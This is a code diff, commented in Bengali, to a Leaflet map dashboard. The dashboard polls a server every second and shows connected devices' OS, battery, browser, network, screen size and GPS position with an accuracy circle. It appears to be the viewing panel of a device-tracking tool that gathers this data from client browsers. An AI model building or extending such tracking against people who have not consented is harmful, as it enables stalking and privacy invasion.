@@ -42,8 +42,8 @@
         }).addTo(map);
         
         let markers = {};
+        let circles = {}; // নির্ভুলতার বৃত্ত রাখার জন্য
 
-        // প্রতি ২ সেকেন্ডে সার্ভার থেকে ডেটা নিয়ে আসার ফাংশন
         function fetchClients() {
             fetch('/api/clients')
                 .then(res => res.json())
@@ -56,7 +56,9 @@
                         list.innerHTML = '<div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।</div>';
                         Object.keys(markers).forEach(id => {
                             map.removeLayer(markers[id]);
+                            if(circles[id]) map.removeLayer(circles[id]);
                             delete markers[id];
+                            delete circles[id];
                         });
                         return;
                     }
@@ -68,31 +70,41 @@
                         card.innerHTML = `
                             <div class="name">🖥️ ${data.os || 'অজানা ডিভাইস'}</div>
                             <div class="detail">🔋 ব্যাটারি: ${data.battery || 'N/A'}%</div>
-                            <div class="detail">🌐 ব্রাউজার: ${data.browser || 'N/A'}</div>
-                            <div class="detail">📍 অবস্থান: ${data.lat ? parseFloat(data.lat).toFixed(4) : 'পাওয়া যায়নি'}, ${data.lng ? parseFloat(data.lng).toFixed(4) : ''}</div>
+                            <div class="detail">🌐 ব্রাউজার: ${data.browser || 'N/A'} | 📶 নেটওয়ার্ক: ${data.network || 'N/A'}</div>
+                            <div class="detail">📱 স্ক্রিন: ${data.screen || 'N/A'}</div>
+                            <div class="detail">📍 অবস্থান: ${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</div>
+                            <div class="detail" style="font-size:11px; color:#facc15;">🎯 নির্ভুলতা: ${data.accuracy ? Math.round(data.accuracy) + ' মিটার' : 'N/A'}</div>
                             <div class="detail" style="font-size:11px; color:#64748b;">🕒 শেষ আপডেট: ${data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A'}</div>
                         `;
                         list.appendChild(card);
 
                         if (data.lat && data.lng) {
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
+                            const acc = data.accuracy ? parseFloat(data.accuracy) : 50;
+                            
+                            // মার্কার আপডেট
                             if (markers[id]) {
                                 markers[id].setLatLng(pos);
+                                if(circles[id]) circles[id].setLatLng(pos).setRadius(acc);
                             } else {
                                 const marker = L.marker(pos).addTo(map);
-                                marker.bindPopup(`<b>${data.os}</b><br>ব্যাটারি: ${data.battery}%`);
+                                marker.bindPopup(`<b>${data.os}</b><br>নির্ভুলতা: ~${Math.round(acc)}m`);
                                 markers[id] = marker;
+                                
+                                // নির্ভুলতার বৃত্ত তৈরি
+                                const circle = L.circle(pos, { radius: acc, color: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
+                                circles[id] = circle;
                             }
-                            map.setView(pos, 14);
+                            map.setView(pos, 16); // লোকেশনে জুম করা
                         }
                     });
                 })
                 .catch(err => console.error("Error fetching clients:", err));
         }
 
-        // প্রথমবার লোড হওয়ার সাথে সাথে কল করবে, তারপর প্রতি ২ সেকেন্ডে
+        // প্রথমবার কল হবে, তারপর প্রতি ১ সেকেন্ডে (১০০০ মিলি সেকেন্ড) রিফ্রেশ হবে
         fetchClients();
-        setInterval(fetchClients, 2000);
+        setInterval(fetchClients, 1000);
     </script>
 </body>
 </html>
